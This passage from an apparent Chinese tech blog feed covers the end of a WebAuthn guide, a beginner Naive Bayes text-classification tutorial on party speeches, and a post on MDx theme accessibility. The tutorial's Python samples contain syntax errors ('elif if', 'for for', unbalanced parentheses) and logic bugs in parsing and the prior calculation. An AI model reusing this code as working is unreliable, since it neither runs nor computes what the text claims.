\"required\",\r\n        allowCredentials: [],\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    appid: \"https://example.com\" //U2F appid\r\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"\n<blockquote>\n<p>有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。</p>\n<footer>——我瞎编的</footer>\n</blockquote>\n<p>为什么这篇文章的标题是 NLP 找门呢？因为如果你看完了这篇文章，你就可以<strong>准备入门</strong>自然语言处理 (<strong>N</strong>atural <strong>L</strong>anguage <strong>P</strong>rocessing) 了。我会把这篇文章当作一篇彻彻底底的 NLP 入门文章来写，尽量避免“专业高端”词汇和“全是奇怪符号”的式子，这样<strong>只要你有高中数学基础</strong>，就能毫无压力地看完这篇文章，学会使用朴素贝叶斯分类算法分类文本。</p>\n<p>让我们开始吧。</p>\n<h1>所以，啥是朴素贝叶斯？</h1>\n<p>简单来说，朴素贝叶斯 (Naïve Bayes) <strong>是一个简单但高效的分类算法</strong>，在进行不复杂的文本分类时高效且拥有不低的准确度，判断垃圾邮件就是用朴素贝叶斯进行文本分类的一个经典例子。当然朴素贝叶斯分类不仅能用在 NLP 中，在许多分类问题中朴素贝叶斯也有非常好的效果，但我们今天只关注它在 NLP 中的应用。</p>\n<p>要了解朴素贝叶斯，我们要先来了解一下贝叶斯定理。</p>\n<blockquote>\n<p>每增加一个数学公式都会使读者减半。</p>\n<footer>——霍金</footer>\n</blockquote>\n<p>那么，就让我们先来看看贝叶斯定理的公式吧（笑</p>\n<p>$$P(A|B) = \\frac{P(AB)}{P(B)} = \\frac{P(B|A)P(A)}{P(B)}$$</p>\n<p>其实还是很简单的，运用高中的条件概率知识就能理解。本质上，贝叶斯定理给出了一种方法，使得我们可以在 \\(P(A|B)\\) 和 \\(P(B|A)\\) 之间互相转换，因为通常情况下它们是不一样的。</p>\n<p>要更好地理解，请考虑这样一个例子：</p>\n<blockquote><p>假设有一个学校图书馆，图书管理员正为找不到某本书而发愁。已知老师有 70% 的意愿借走这本书，而是学生的意愿是 30%，这个学校的师生比例是 1:10，那么借走这本书的人是老师的概率有多大？</p></blockquote>\n<p>设学校总人数为 \\(T\\)，我们可以很容易地写出这样的一个式子：</p>\n<p>$$\\begin{align} P &amp; = \\frac{T\\cdot\\frac{1}{11}\\cdot 70\\%}{T\\cdot\\frac{1}{11}\\cdot 70\\%+T\\cdot\\frac{10}{11}\\cdot 30\\%} \\\\ &amp; = \\frac{70\\%}{70\\%+10\\times30\\%} \\\\ &amp; = \\frac{7}{37} \\end{align}$$</p>\n<p>这就是贝叶斯定理了！等等，你可能会挠挠头，这哪里是贝叶斯了？别急，如果我们把最上面的式子换个字母的话…</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>在这里，\\(H\\) 指 Hypothesis，即假设，而 \\(E\\) 指 Evidence，即证据。这样，这个式子就很好理解了，在我们上面的例子里，借走书是证据，那么 \\(P(E)\\) 就是某个人选择借走这本书的概率；这个人是老师是假设，那么这个人是老师的概率是 \\(P(H)\\)。<strong>注意这里的概率指在学校中抽一个人是老师的概率，并不是“在借走书的前提下”这个人是老师的概率</strong>，而“在借走书的前提下”这个人是老师的概率应该是 \\(P(H|E)\\)，也正是我们要求的概率。同样地，而“这个人是老师”的前提下借走书的概率就是 \\(P(E|H)\\) 了。</p>\n<p>那么再来看看上面我们凭小学知识就列出的计算式，如果把里面的具体数据换成概率来表示的话，这个式子就会变成…</p>\n<p>$$P(H|E) = \\frac{T\\cdot P(E|H)P(H)}{T\\cdot P(E|H)P(H) + T\\cdot P(E|\\neg H)P(\\neg H)}$$</p>\n<p>好吧，这里解释一下，\\(\\neg\\) 符号表示“非”，所以 \\(P(E|\\neg H)\\) 表示在“这个人不是老师”的前提下借走书的概率。而 \\(T\\cdot P(E|H)P(H)\\) + \\(T\\cdot P(E|\\neg H)P(\\neg H)\\)，即“可能借走书的老师的数量 + 可能借走书的学生的数量”，就是“可能借走书的人的数量”了，也就是 \\(T\\cdot P(E)\\)。上下消去 \\(T\\)，我们就能得到上面的式子了。</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>这就是贝叶斯了定理。如果你还是不太清楚，可以去看看 3Blue1Brown 的<a href=\"https://www.bilibili.com/video/av84799361\">这个视频</a>，图形化的讲解会清晰很多。</p>\n<p>这里我要提一下这个式子里各部分的专有名称了（“专业高端”词汇警告），你可以不记住，直接看后面。</p>\n<ul>\n<li>\\(P(H|E)\\) 叫做 \\(H\\) 的<strong>后验概率</strong>，反之亦然</li>\n<li>\\(P(H)\\) 叫做 \\(H\\) 的<strong>先验概率</strong>，反之亦然</li>\n<li>特别地，我们把 \\(P(E|H)\\) 称作<strong>“似然值”</strong>，即 likelihood</li>\n</ul>\n<p>那什么是朴素贝叶斯呢？按上面所说的，朴素贝叶斯是一种分类算法。简单来说，朴素贝叶斯将一个对象的各个特征考虑为互相独立，然后根据这些特征的概率的乘积来判断对象所属的分类。基本原理如下：</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)} \\propto P(E|H)P(H) = P(H)\\prod_{i}P(W_i|H)$$</p>\n<p>在这里，\\(W_i\\) 指某一对象的第 \\(i\\) 个特征，对于文本分类来说，这就是一段文本中的某个单词。</p>\n<p>朴素贝叶斯之所以“朴素”，是因为它要求<strong>各个特征间是独立的</strong>，在文本分类中也就是各个单词之间互不干扰。虽然思路简单的代价是适用范围变窄，不过由于这样的简化在很多情况下已经足够了，因此实际上朴素贝叶斯的应用范围非常广。<del>你看朴素贝叶斯 <strong>N</strong>aïve <strong>B</strong>ayes 的缩写都是 NB 了，能不厉害吗（逃</del></p>\n<h1>那么，咋分类啊</h1>\n<p>看来你这下完全听懂了呢（笑），是时候看看如何在 NLP 中应用朴素贝叶斯了。和上面一样，我们用一个具体的例子来说明。我们的目标是让电脑学会分类美国共和党和民主党的演讲稿，由于两个党派的演讲风格不同，所以这样的分类在理论上是可行的。</p>\n<div class=\"wp-block-file\">\n<a href=\"https://acdn.flyhigher.top/nlp/material.zip\" download>material.zip</a><a href=\"https://acdn.flyhigher.top/nlp/material.zip\" class=\"wp-block-file__button\" download>下载</a>\n</div>\n<p>上面我们要用到的数据集，你可以下载下来一起动手玩一玩。先说一下数据集的数据结构吧，压缩包里有两个文件，<code>train.txt</code> 将会被当作训练数据集，而 <code>test.txt</code> 则会作为训练结束后的验证数据集。两个文本文件里数据的结构是类似的，就像这样：</p>\n<pre class=\"EnlighterJSRAW\">BLUE WELL I AM SO HONORED AND PERSONALLY UNKNOWNWORD TO BE HERE...\r\nRED THANK YOU . THIS IS QUITE AN INSTITUTION . IT'S GOOD TO BE...</pre>\n<p>每行都是一篇演讲稿，每行的第一个单词指明了这篇演讲稿所属的党派，<code>RED</code> 指共和党，而 <code>BLUE</code> 指民主党。所有单词和符号都已经被转为大写并由空格分隔方便处理。<code>train.txt</code> 有共和党演讲稿和民主党演讲稿各 23 篇，<code>test.txt</code> 有 6 篇共和党演讲稿，12 篇民主党演讲稿。</p>\n<p>明白了？那我们就开始吧。</p>\n<h2>捋捋思路</h2>\n<p>首先，我们需要考虑如何在文本分类中应用朴素贝叶斯。很简单，按朴素贝叶斯的思路，<strong>计算每个词在某一分类下的出现概率，然后将某篇文章的所有词的概率相乘，再乘以该分类的先验概率，就可以得到某篇文章在某一分类下的概率。</strong></p>\n<p>$$P(Class|Article) = P(Class)\\prod_{i}P(Word_i|Class)$$</p>\n<p>各个分类概率都计算完成后，概率最高的那个分类就是这篇文章可能所属的分类。这个思路的核心就是用词决定了文本风格，文本的不同类别用词会有差异，只要能量化这些差异就可以分类文本。在我们的例子中，我们可以从 <code>train.txt</code> 中统计各个词汇的出现情况，然后用 <code>test.txt</code> 中的数据按上面的算法验证我们算法的准确性。</p>\n<p>这个思路很简单也很清晰，但还有一些问题需要解决。<strong>第一，有的时候，我们的测试数据集中可能会出现一个在训练数据集中没有出现过的词语。这个时候，朴素贝叶斯的计算结果会是 0。</strong>如果我们把 0 乘进式子中，那就别想得到正常的结果了。所以，我们还需要对计算某一单词在某一分类中的式子稍加改进。使用拉普拉斯平滑，就可以避免出现概率为 0 的情况。别被名字吓到，拉普拉斯平滑是一种非常简单的平滑方法：在分子上 +1，在分母上加整个取值范围，这样就可以给整个分式加上非常微小的偏移，避免出现 0。</p>\n<p>$$\\begin{align} P(Word_i|Class) &amp; = \\frac{Word_iCountInClass}{AllWordCountInClass} \\\\ &amp; \\approx \\frac{Word_iCountInClass + 1}{AllWordCountInClass + UniqueWordCount} \\end{align}$$</p>\n<p><strong>第二，对于长文本，大部分词语在某一分类中的出现概率是远小于 1 的，加上长文本词汇量大，往往概率相乘的结果会非常小。</strong>受限于计算机处理浮点数的原理，精确处理这么小的数字是很麻烦的。幸好，运用一些简单的数学知识就可以将其转化为更精确的表达，<strong>那就是取对数。</strong></p>\n<p>首先，将概率计算结果取对数并不影响我们的计算结果。因为取对数是一个单调递增的操作，而我们计算概率只是为了排序选择概率最高的分类，因此取对数是不影响我们排序的。而把多项式取对数，等于把多项式的每一项取对数后相加。所以我们有：</p>\n<p>$$\\lg{\\Big(P(Class)\\prod_{i}P(Word_i|Class)\\Big)} = \\lg{P(Class)} + \\sum_i\\lg{P(Word_i|Class)}$$</p>\n<p>大部分情况下，在每一次取对数的时候，要取对数的数字的大小，即 \\(P(Word_i|Class)\\) 尚还在计算机能处理的范围内，<strong>因此我们可以放心地使用取对数的方法</strong>，避免计算机精度不够影响结果。</p>\n<p><strong>第三就是在某些情况下，可能会有部分词语干扰计算结果</strong>，如 and, is 这类的被大量使用的中性词。如果希望得到更好的结果，我们可以维护一个停用词表，在计算时排除停用词即可。或者，我们可以在计算完每个单词的出现数量后，排除数量最多的前 \\(N\\) 个单词，避免这些单词过多地影响计算。</p>\n<h2>写点代码</h2>\n<p>现在我们终于可以开始实战，写点代码了。我会用简单的 Python 来表达思路。好了，理一理思绪，第一步我们要做的，是统计训练数据集中的用词情况。具体来说，根据上面的思考，我们需要统计的有：</p>\n<ul>\n<li>每个单词在各分类中出现的数量</li>\n<li>各分类中的不重复词数量</li>\n</ul>\n<p>用 Python 简单表示如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">#读入数据过程略...\r\ndata_raw = \"读入的数据\".split('\\n') #按行分隔\r\ndata_blue = []\r\ndata_red = []\r\nword_count_blue = {}\r\nword_count_red = {}\r\n\r\nfor line_data in data_raw:\r\n    word_list = line_data.split(\" \") #分隔单词\r\n    if word_list[0] == \"BLUE\":\r\n        for i in range(1,len(word_list)):\r\n            if not is_excluded(word_list[i]): #判断是否为停用词\r\n                data_blue.append(word_list[i])\r\n                #统计单词出现次数\r\n                word_count_blue.setdefault(word_list[i], 0)\r\n                word_count_blue[word_list[i]] += 1\r\n    elif if word_list[0] == \"RED\":\r\n        #Class = red 时同理...\r\n\r\n#统计非重复词\r\nunique_words_blue = list(set(data_blue))\r\nunique_words_red = list(set(data_red))</pre>\n<p>训练过程到这里就结束了，计算机已经知道了各政党演讲的用词习惯。很简单吧？接下来我们就要使用测试数据集来测试准确度了。<strong>这里开始就涉及到朴素贝叶斯的计算了</strong>，可能会稍微复杂一点点。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">import math\r\n#读入测试数据过程略...\r\ntest_data_raw = \"读入的数据\".split('\\n') #按行分隔\r\ntest_data = []\r\n\r\nfor for line_data in test_data_raw:\r\n    if line_data[0] == \"BLUE\":\r\n        content_data = line_data.split(\" \").pop(0)\r\n        test_data.append({\"class\": \"blue\", \"content\": content_data})\r\n\r\nfor line_data in test_data:\r\n    if line_data[\"class\"] == 'blue':\r\n        posibility_blue = 0\r\n        for word in line_data[\"content\"]:\r\n            #计算各单词概率，取对数后相加，使用了拉普拉斯平滑\r\n            if word in word_count_blue:\r\n                posibility_blue += math.log((word_count_blue[word]+1)/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n            else:\r\n                posibility_blue += math.log(1/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n        #最后加上该分类概率的对数\r\n        posibility_blue += math.log(len(data_blue/((len(data_blue)+(len(data_red)))\r\n    elif line_data[\"class\"] == 'red':\r\n        #Class = red 时同理...</pre>\n<p>计算完成后，我们就得到每篇演讲稿在各分类下的概率了。之后，简单的比较就能得出推断的分类：如果 \\(P(Red|Article)\\) 大于 \\(P(Blue|Article)\\)，那么这篇演讲稿就更可能是共和党的演讲稿，反之则是民主党的演讲稿。</p>\n<p>很好理解吧？那么这么简单的思路，准确性怎么样呢？对于我们的例子，这是我设置了个别停用词后的结果：</p>\n<pre class=\"EnlighterJSRAW\">+-----+-------+--------------+--------------+-------+-------+\r\n|   ID|  Class|        P(Red)|       P(Blue)|  Guess| Status|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|    1|   Blue|  -23204.68377|  -22998.67066|   Blue|      √|\r\n|    2|   Blue|  -16438.44625|  -16137.48257|   Blue|      √|\r\n|    3|   Blue|  -33468.81214|  -32567.61801|   Blue|      √|\r\n|    4|   Blue|    -8606.2193|   -8601.50426|   Blue|      √|\r\n|    5|   Blue|  -12430.97436|  -11935.70662|   Blue|      √|\r\n|    6|   Blue|  -44033.02883|  -43877.55367|   Blue|      √|\r\n|    7|   Blue|   -16947.2851|  -16758.57542|   Blue|      √|\r\n|    8|   Blue|  -26957.26997|  -26889.62444|   Blue|      √|\r\n|    9|   Blue|  -27503.73985|  -27249.21828|   Blue|      √|\r\n|   10|   Blue|   -20528.4457|   -19991.1248|   Blue|      √|\r\n|   11|   Blue|  -20337.96493|  -19860.12831|   Blue|      √|\r\n|   12|   Blue|  -28409.28489|  -28118.98017|   Blue|      √|\r\n|   13|    Red|  -13756.01015|  -14488.11751|    Red|      √|\r\n|   14|    Red|  -17221.22732|  -17710.15936|    Red|      √|\r\n|   15|    Red|  -17397.45136|  -17899.98659|    Red|      √|\r\n|   16|    Red|  -10724.69095|  -11092.77837|    Red|      √|\r\n|   17|    Red|  -10402.40027|  -10859.48681|    Red|      √|\r\n|   18|    Red|   -9371.53792|    -9669.6769|    Red|      √|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|                                      Total: 18/18, 100.0% |\r\n+-----------------------------------------------------------+</pre>\n<p><strong>100% 的准确率哦！</strong>事实上，对于我们的这个例子，就算不设置停用词，我们仍能达到 100% 的分类准确率。朴素贝叶斯分类的确很 NB 呢。</p>\n<h1>更进一步</h1>\n<p>我们的探索到这里就结束了，但如果你有兴趣，完全可以继续探索下去。我们的例子是一个非常简化的例子，在实际情况中，还有很多问题需要解决。比如，对于中文及类似语言，不存在拉丁语系的天然分词结构，而朴素贝叶斯的文本分类是基于单词的，那么<strong>中文的分词就会是个问题；</strong>再比如，对于朴素贝叶斯分类来说，<strong>词语之间的顺序是不影响分类结果的</strong>，但这就会导致“今天心情很好，但昨天不好”和“昨天心情很好，但今天不好”在朴素贝叶斯看来是一样的，要想获得更好的结果，我们必须<strong>考虑词语的顺序。</strong></p>\n<p>这些问题，今天我们就不再深究了，但你可以自己探索。比如，引入思路同样很简洁的马尔科夫链，我们就可以让计算机学会考虑词语间的顺序，不过那就会是另一个话题了。</p>\n","link":"https://flyhigher.top/develop/1989.html"},{"title":"MDx 中增强页面可访问性的细节","date":"2020-01-25 16:45:04","description":"\n<blockquote><p>这篇文章本来是打算发在 <a href=\"https://mdxblog.flyhigher.top/\">MDx Blog</a> 的，不过写到后来发现这篇文章相对来说还是有价值的，于是就将这篇文章转移到了无垠，MDx Blog 则不再发表这篇文章。</p></blockquote>\n<p>从 MDx 开发之初，增强页面的可访问性就被列为了一个重要目标。从 HTML 语义化，到 ARIA 地标，再到 <code>prefers-reduced-motion</code>，随着浏览器对于增强页面可访问性的支持功能越来越多，MDx 也在不断地更新，让更多的人都能毫无困难地浏览、查看由 MDx 渲染的网页。本文会详细说明一些 MDx 中增强页面可访问性的细节，<strong>如果你希望增强自己开发的网页的可访问性，本文可能会对你有所帮助。</strong></p>\n<h1>基础性增强</h1>\n<p>增强可访问性，最重要也是最基础的一点就是 HTML 语义化。通过使用 HTML 5 语义化标签和 ARIA Role 标签，我们可以很方便地<strong>将整个网页在语义上分为几部分，而这将有效地改善屏幕阅读器对网页的分析质量，使视力障碍用户更好地浏览网页。</strong></p>\n<h2>HTML 语义化</h2>\n<p><strong>HTML 语义化属于增强页面可访问性的基础中的基础。</strong>通过使用语义化的 HTML 标签，我们可以方便地为网页中的各部分标记功能而不影响页面样式。随着符合 HTML 5 的现代化网页成为主流，语义化标签已被很大一部分网站所支持，我也不过多赘述了。就举几个常用的“地标性”标签吧：</p>\n<ul>\n<li>\n<code>header</code> 标签标记页眉，默认样式同 <code>div</code>，不要把它和 <code>head</code> 搞混了</li>\n<li>\n<code>main</code> 标签标记页面的主要内容，默认样式同 <code>div</code>\n</li>\n<li>\n<code>article</code> 标签标记文章（在 HTML 5 中它指任何独立或可复用的文本），默认样式同 <code>div</code>\n</li>\n<li>\n<code>footer</code> 标签标记页脚，默认样式同 <code>div</code>\n</li>\n<li>\n<code>nav</code> 标签标记页面导航栏区域，默认样式同 <code>div</code>\n</li>\n<li>\n<code>aside</code> 标签标记侧栏，默认样式同 <code>div</code>\n</li>\n<li>\n<code>section</code> 标签标记“一组内容”，你可以把它看作是划定网页中一块区域的通用标签，默认样式同 <code>div</code>\n</li>\n</ul>\n<p>只要用这些标签替代 <code>div</code> 而不是无脑使用 <code>div</code> 就能提高页面的可访问性。MDx 使用了这些标签来增强页面的可访问性。</p>\n<h2>下一步，ARIA</h2>\n<p>有的时候，出于一些原因，我们没法使用语义化的 HTML 标签，或者没有合适的语义化标签来标记内容，这时候<strong>我们就需要使用 ARIA (Accessible Rich Internet Applications，可访问的富互联网应用)。</strong>ARIA 的基础用法很简单，只要在相应元素上加上 <code>role</code> 属性指定该元素的功能即可。下面是一个简单的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;div role=\"navigation\"&gt;\r\n  &lt;ul&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page A&lt;/a&gt;&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page B&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page C&lt;/a&gt;&lt;/li&gt;\r\n  &lt;/ul&gt;\r\n&lt;/div&gt;</pre>\n<p>通过 <code>role=\"navigation\"</code>，我们把一个 <code>div</code> 标记为了导航栏区域。实际上，对屏幕阅读器来说，这和 <code>nav</code> 标签在语义上是一致的。上一节中的例子都可以分别用以下 ARIA Role 表示：</p>\n<ul>\n<li><code>role=\"heading\"</code></li>\n<li><code>role=\"main\"</code></li>\n<li><code>role=\"article\"</code></li>\n<li><code>role=\"contentinfo\"</code></li>\n<li><code>role=\"navigation\"</code></li>\n<li><code>role=\"complementary\"</code></li>\n<li><code>role=\"region\"</code></li>\n</ul>\n<p>除此以外，MDx 还使用了 <code>role=\"banner\"</code> 和 <code>role=\"search\"</code> 来分别标记页面中的顶部栏和搜索表单。另外，<strong>有的时候 <code>role</code> 属性还需配合 <code>aria-*</code> 属性一同使用</strong>，具体规则比较复杂，我就不在这里赘述了，具体可参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles\">WAI-ARIA Roles – MDN</a>。</p>\n<h1>媒体查询来帮忙</h1>\n<p>CSS 的媒体查询其实是一个非常强大的特性，<strong>妥善利用其中的一些特性，我们可以在网页外观上大大增强网页的可访问性。</strong>除了已经烂大街的“对浏览器窗口大小”响应的媒体查询，我会介绍 3 个很少有网站充分利用的媒体查询。</p>\n<h2>print</h2>\n<p><code>print</code> 媒体查询其实已经“历史悠久”了，<strong>只要使用 <code>@media print {...}</code> 就可以创建只在打印页面时生效的样式。</strong>通过这种方式，我们可以让页面在打印时应用一套为打印优化的样式，增强页面在物理纸张上的可访问性。</p>\n<blockquote><p>维基百科是对打印样式做了单独适配的著名例子。</p></blockquote>\n<p><strong>由于在打印的情况下，页面已经离开了“可交互”的范围，还有分页这种在屏幕中无需考虑的问题，要让页面在物理纸张上仍能被轻松地阅读，我们需要做一些特殊的适配。</strong>直接来看一个例子吧。以下是 MDx 针对打印情况进行的一些特殊优化，样式的具体理由已经写在了注释中。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media print {\r\n    /*隐藏不必要的元素*/\r\n    header, .mdx-ad-after-article, .mdx-ad-in-article, .mdx-post-money, .page-footer-nav, .mdx-same-posts, .spanout button, .mdui-drawer, .mdui-overlay, .mdui-menu, .mdx-share-img-dialog, .mdx-share-wechat-dialog {\r\n        display: none!important;\r\n    }\r\n\r\n    /*使用下划线标记链接*/\r\n    article a {\r\n        text-decoration: underline!important;\r\n    }\r\n    /*由于纸张不可交互，在链接后显示链接到的 URL*/\r\n    article a::after {\r\n        content: \"(\" attr(href) \")\";\r\n    }\r\n\r\n    /*强制白底黑字*/\r\n    html &gt; body {\r\n        background-color: white!important;\r\n    }\r\n    article p {\r\n        color: rgba(0,0,0,.8)!important;\r\n    }\r\n\r\n    /*对于纸张上的长文章，衬线字体拥有更好的可读性。以下字体列表来自 fonts.css*/\r\n    article {\r\n        font: 13pt Georgia, \"Nimbus Roman No9 L\", \"Songti SC\", \"Noto Serif CJK SC\", \"Source Han Serif SC\", \"Source Han Serif CN\", STSong, \"AR PL New Sung\", \"AR PL SungtiL GB\", NSimSun, SimSun, \"TW\\-Sung\", \"WenQuanYi Bitmap Song\", \"AR PL UMing CN\", \"AR PL UMing HK\", \"AR PL UMing TW\", \"AR PL UMing TW MBE\", PMingLiU, MingLiU, serif!important;\r\n    }\r\n\r\n    /*除部分元素外，禁止在元素内部分页*/\r\n    * {\r\n        page-break-inside: avoid;\r\n    }\r\n    article p, article a, #comments, article {\r\n        page-break-inside: auto;\r\n    }\r\n}</pre>\n<p>MDx 自 1.9.3 版本起已经包含了对文章页的打印样式优化。可以很容易地看出，优化后的样式在物理纸张上将更容易阅读。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\" alt=\"\" width=\"1345\" height=\"1602\" class=\"aligncenter size-full wp-image-1959\"></a>\n<h2>prefers-color-scheme</h2>\n<p><code>prefers-color-scheme</code> 是最近才被浏览器广泛支持的一个媒体查询，但它的功能却很强大：<strong>响应系统级黑暗模式。</strong>这样，我们可以在开启黑暗模式的系统中让网页具有更好的可读性。不过由于这个媒体查询直到最近才被广泛支持，因此大部分网站对此并没有进行适配。</p>\n<blockquote><p>一些适配这一特性的网站：少数派、微信公众平台（文章页）等。</p></blockquote>\n<p>通过像这样的媒体查询，我们可以在系统启用黑暗模式时让页面实时响应：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    body {\r\n        background-color: #212121;\r\n        color: rgba(255, 255, 255, .7);\r\n    }\r\n}</pre>\n<p><code>prefers-color-scheme</code> 一共有 3 个可能值：<code>no-preference</code>, <code>light</code> 和 <code>dark</code>。你也可以不像上面的例子那样默认使用亮色样式并在黑暗模式下启用黑暗样式，而可以反过来将黑暗样式作为默认，用亮色样式覆盖。在不支持的浏览器上将会显示默认样式（即媒体查询不会生效）。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<h2>prefers-reduced-motion</h2>\n<p>看名字就猜得出，<code>prefers-reduced-motion</code> 是和 <code>prefers-color-scheme</code> 师出同门的媒体查询。因此，和 <code>prefers-color-scheme</code> 一样，它也是在最近才获得了浏览器的广泛支持。它的作用也很强大：<strong>响应系统的“减弱动态效果”模式。</strong>这对某些不喜欢甚至无法接受动画的用户可能很有帮助。要知道，对有些用户来说这甚至是医疗上的必要。使用如下的媒体查询，我们可以在系统启用减弱动态效果模式时让页面实时响应，减弱动画：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-reduced-motion: reduce) {\r\n    /*只是一个示例，实际情况中可以保留一些淡入淡出效果*/\r\n    * {\r\n        transition: all 0s!important;\r\n        transform: none!important;\r\n    }\r\n}</pre>\n<p><code>prefers-reduced-motion</code> 只有 2 个可能值：<code>no-preference</code> 和 <code>reduce</code>，在不支持的浏览器上该媒体查询不会生效。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\" alt=\"\" width=\"792\" height=\"515\" class=\"aligncenter size-full 